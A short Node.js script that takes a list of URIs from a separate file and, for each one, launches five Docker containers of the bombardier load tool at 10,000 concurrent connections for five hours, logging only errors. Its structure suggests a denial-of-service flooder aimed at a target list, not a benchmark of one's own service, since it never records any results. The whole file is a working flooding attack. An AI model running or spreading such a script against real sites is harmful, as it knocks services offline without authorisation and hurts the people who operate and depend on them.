//@ts-ignore
import child_process from 'child_process';
import { list } from './list.js';


list.forEach((uri) => {
    for(let i = 0; i < 5; i++) {
        child_process.exec(
            `docker run -i --rm alpine/bombardier -c 10000 -d 5h -l ${uri}`,
            (err, stdout, stderr) => {
                if(err) {
                    console.log({ uri, err });
                }
        });
    }
})